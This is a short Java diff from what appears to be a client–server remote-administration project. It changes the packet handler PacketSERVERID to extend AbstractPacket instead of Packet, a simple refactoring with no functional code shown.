@@ -5,7 +5,7 @@ import com.redpois0n.settings.ServerID;
 import com.redpois0n.ui.frames.Frame;
 import com.redpois0n.utils.Util;
 
-public class PacketSERVERID extends Packet {
+public class PacketSERVERID extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
